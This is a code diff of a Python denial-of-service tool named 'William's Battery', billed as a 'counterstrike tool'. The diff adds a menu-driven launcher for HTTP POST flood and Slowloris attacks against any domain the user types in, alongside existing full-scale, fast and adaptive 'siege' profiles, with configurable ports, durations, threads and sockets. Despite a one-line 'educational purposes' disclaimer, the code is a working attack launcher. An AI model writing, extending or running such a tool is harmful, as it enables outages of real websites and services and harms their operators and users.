@@ -141,30 +141,104 @@ def adaptive_strike(target):
         time.sleep(2)
 
 
-# --- Main execution block remains the same ---
+def run_layer7_attacks(choice, target):
+    """Orchestrator for specific Layer 7 attacks."""
+    stop_event, pause_event = threading.Event(), threading.Event()
+
+    if choice == 1:  # HTTP POST Flood
+        print("\n--- CONFIGURING HTTP POST FLOOD ---")
+        try:
+            port = int(input("Enter target port (e.g., 80 or 443): "))
+            duration = int(input("Enter attack duration in seconds (e.g., 120): "))
+            threads = int(input("Enter number of threads (e.g., 150): "))
+        except ValueError:
+            print("[!] Invalid input. Please enter numbers.")
+            return
+
+        print(f"[+] Launching HTTP POST flood on {target}:{port} for {duration}s...")
+        attack_thread = threading.Thread(
+            target=counter_strike_helper.attack_http_post,
+            args=(target, port, duration, stop_event, pause_event, threads)
+        )
+
+    elif choice == 2:  # Slowloris Attack
+        print("\n--- CONFIGURING SLOWLORIS ATTACK ---")
+        try:
+            port = int(input("Enter target port (e.g., 80 or 443): "))
+            duration = int(input("Enter attack duration in seconds (e.g., 120): "))
+            sockets = int(input("Enter number of sockets to open (e.g., 200): "))
+        except ValueError:
+            print("[!] Invalid input. Please enter numbers.")
+            return
+
+        print(f"[+] Launching Slowloris attack on {target}:{port} for {duration}s...")
+        attack_thread = threading.Thread(
+            target=counter_strike_helper.attack_slowloris,
+            args=(target, port, duration, stop_event, pause_event, sockets)
+        )
+    else:
+        print("[!] Invalid Layer 7 attack choice.")
+        return
+
+    # Launch the chosen attack
+    attack_thread.start()
+    try:
+        # Wait for the thread to complete (it will run for the specified duration)
+        attack_thread.join()
+        print("\n[+] Layer 7 attack has completed its duration.")
+    except KeyboardInterrupt:
+        print("\n[!] Keyboard interrupt received. Signaling attack to stop...")
+        stop_event.set()
+        attack_thread.join(timeout=5)  # Give it time to stop
+        print("\n[+] Attack stopped.")
+
+
+# --- Main Execution Block with New Menu ---
 if __name__ == "__main__":
     print("-" * 60 + "\nWELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL\n" + "-" * 60)
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
     target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
 
     try:
-        options_text = """
-Select an attack profile:
+        main_menu_text = """
+Select Attack Category:
+  1: Blended Profile Attacks (Full, Fast, Adaptive)
+  2: Specific Layer 7 Attacks (POST Flood, Slowloris)
+
+Please enter your option: """
+        main_choice = int(input(main_menu_text))
+
+        if main_choice == 1:
+            profile_menu_text = """
+Select a Blended Profile:
   1: Full Scale Counterstrike (Long-running siege)
   2: Fast Counterstrike (Short, intense burst)
   3: Adaptive Counterstrike (Smart, responsive attack)
 
 Please enter your option: """
-        options = int(input(options_text))
+            profile_choice = int(input(profile_menu_text))
 
-        if options == 1:
-            full_scale_counter_strike(target_domain)
-        elif options == 2:
-            fast_scale_counter_strike(target_domain)
-        elif options == 3:
-            adaptive_strike(target_domain)
+            if profile_choice == 1:
+                full_scale_counter_strike(target_domain)
+            elif profile_choice == 2:
+                fast_scale_counter_strike(target_domain)
+            elif profile_choice == 3:
+                adaptive_strike(target_domain)
+            else:
+                print("Invalid profile selected. Exiting.")
+
+        elif main_choice == 2:
+            l7_menu_text = """
+Select a Layer 7 Attack:
+  1: HTTP POST Flood (High CPU/DB load)
+  2: Slowloris (Connection pool exhaustion)
+
+Please enter your option: """
+            l7_choice = int(input(l7_menu_text))
+            run_layer7_attacks(l7_choice, target_domain)
+
         else:
-            print("Invalid option selected. Exiting.")
+            print("Invalid category selected. Exiting.")
 
     except ValueError:
         print("Invalid input. Please enter a number.")
